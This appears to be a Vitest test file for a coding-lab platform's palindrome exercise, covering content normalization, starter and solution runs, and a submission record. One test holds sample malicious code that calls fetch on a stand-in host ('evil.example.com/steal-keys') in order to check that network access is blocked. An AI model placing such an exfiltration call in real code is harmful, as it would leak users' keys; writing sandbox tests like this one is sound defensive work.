import { describe, it, expect } from 'vitest';
import { normalizeLabDetail } from '../features/lab/domain/labContentCodec';
import { expect as createMatcher } from '../features/lab/runtime/matchers/expect';
type TestCaseResult = { name: string; passed: boolean; message?: string };

describe('Subtask 8.3: Automation Lab End-to-End Flow Test', () => {
  const sampleAutomationLab = {
    id: 'lab-automation-palindrome',
    title: 'Check Palindrome Function',
    sandboxType: 'js_worker',
    instructions: '# Palindrome Checker\n\nImplement `isPalindrome(str)` returning true if the string reads the same forwards and backwards.',
    initialSnippet: 'function isPalindrome(str) {\n  // TODO: implement\n  return false;\n}',
    solution: 'function isPalindrome(str) {\n  const clean = str.toLowerCase().replace(/[^a-z0-9]/g, "");\n  return clean === clean.split("").reverse().join("");\n}',
    testScript: `
test('handles simple palindrome', () => {
  expect(isPalindrome('racecar')).toBe(true);
});
test('handles non-palindrome', () => {
  expect(isPalindrome('hello')).toBe(false);
});
test('handles palindrome with mixed case and spaces', () => {
  expect(isPalindrome('A man a plan a canal Panama')).toBe(true);
});
`,
  };

  it('normalizes automation lab into strictly typed envelope', () => {
    const lab = normalizeLabDetail(sampleAutomationLab as any);
    expect(lab.envelope.sandboxType).toBe('js_worker');
    expect(lab.envelope.initialSnippet).toContain('TODO: implement');
    expect(lab.envelope.testScript).toContain("expect(isPalindrome('racecar')).toBe(true)");
  });

  it('fails tests when running initial uncompleted starter snippet', () => {
    const testResults: TestCaseResult[] = [];

    const test = (name: string, fn: () => void) => {
      try {
        fn();
        testResults.push({ name, passed: true });
      } catch (err: any) {
        testResults.push({ name, passed: false, message: err.message });
      }
    };

    // Run initial snippet
    const runCode = new Function('expect', 'test', `
      ${sampleAutomationLab.initialSnippet}
      ${sampleAutomationLab.testScript}
    `);

    runCode(createMatcher, test);

    expect(testResults.length).toBe(3);
    const passedCount = testResults.filter((t) => t.passed).length;
    expect(passedCount).toBe(1); // 'handles non-palindrome' returns false, which matches!
    const failedCount = testResults.filter((t) => !t.passed).length;
    expect(failedCount).toBe(2);
  });

  it('passes 100% of test cases when learner submits full solution', () => {
    const testResults: TestCaseResult[] = [];

    const test = (name: string, fn: () => void) => {
      try {
        fn();
        testResults.push({ name, passed: true });
      } catch (err: any) {
        testResults.push({ name, passed: false, message: err.message });
      }
    };

    // Run full solution
    const runSolution = new Function('expect', 'test', `
      ${sampleAutomationLab.solution}
      ${sampleAutomationLab.testScript}
    `);

    runSolution(createMatcher, test);

    expect(testResults.length).toBe(3);
    const passedCount = testResults.filter((t) => t.passed).length;
    expect(passedCount).toBe(3);
    const allPassed = testResults.every((t) => t.passed);
    expect(allPassed).toBe(true);
  });

  it('blocks network access and unsafe globals in sandbox simulation', () => {
    const blockedFetch = () => {
      throw new Error('SecurityError: Network access disabled in practice lab');
    };

    const maliciousUserCode = `
      function attack() {
        return fetch('https://evil.example.com/steal-keys');
      }
    `;

    const runner = new Function('fetch', `
      ${maliciousUserCode}
      attack();
    `);

    expect(() => runner(blockedFetch)).toThrow('SecurityError: Network access disabled');
  });

  it('assembles final submission record matching backend DTO contract', () => {
    const learnerSubmittedCode = sampleAutomationLab.solution;
    const submissionPayload = {
      labId: sampleAutomationLab.id,
      submittedCode: learnerSubmittedCode,
      status: 'SOLVED' as const,
      executionTimeMs: 14,
      testResults: [
        { name: 'handles simple palindrome', passed: true },
        { name: 'handles non-palindrome', passed: true },
        { name: 'handles palindrome with mixed case and spaces', passed: true },
      ],
    };

    expect(submissionPayload.status).toBe('SOLVED');
    expect(submissionPayload.testResults.every((t) => t.passed)).toBe(true);
    expect(submissionPayload.submittedCode).toContain('split("").reverse().join("")');
  });
});
